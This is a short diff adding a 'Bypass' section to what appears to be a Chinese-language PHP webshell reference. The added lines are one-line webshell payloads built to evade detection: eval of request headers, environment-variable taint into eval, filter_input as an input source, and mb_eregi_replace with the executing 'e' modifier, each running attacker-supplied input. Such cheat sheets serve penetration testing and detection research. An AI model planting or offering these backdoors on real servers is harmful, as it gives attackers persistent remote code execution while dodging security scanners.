@@ -21,6 +21,16 @@ WebShell
 - 利用文件名
     - ``__FILE__``
 
+Bypass
+--------------------------------
+- 基于少见函数
+    - ``mb_eregi_replace('.*',$_GET[1],'','e');``
+- 基于污染传播
+    - ``putenv($_GET["c"]);eval(getenv('path'));``
+- 基于少见源
+    - ``$a = filter_input(INPUT_GET,'c');``
+    - ``eval(end(getallheaders()));``
+
 字符串变形函数
 --------------------------------
 - ucwords
